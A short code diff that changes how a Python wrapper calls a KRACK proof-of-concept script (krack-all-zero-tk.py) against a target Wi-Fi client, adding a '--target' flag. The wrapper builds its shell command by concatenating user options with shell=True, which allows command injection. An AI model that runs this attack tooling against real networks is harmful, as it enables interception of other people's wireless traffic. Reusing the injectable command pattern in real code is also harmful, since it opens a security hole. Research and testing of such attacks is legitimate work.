@@ -121,7 +121,7 @@ def main():
             subprocess.call(["./prepareClientAttack.sh"])
             with open('./attackOutput.txt', 'w') as attackOutput:
                 subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " +
-                                 options.mon + " " + options.targetSSID + " " + options.target + " &"], stdout=attackOutput, shell=True)
+                                 options.mon + " " + options.targetSSID + " --target " + options.target + " &"], stdout=attackOutput, shell=True)
             	attackParser() 
         except KeyboardInterrupt:
             log.info("Cleaning up and restoring wifi ...")
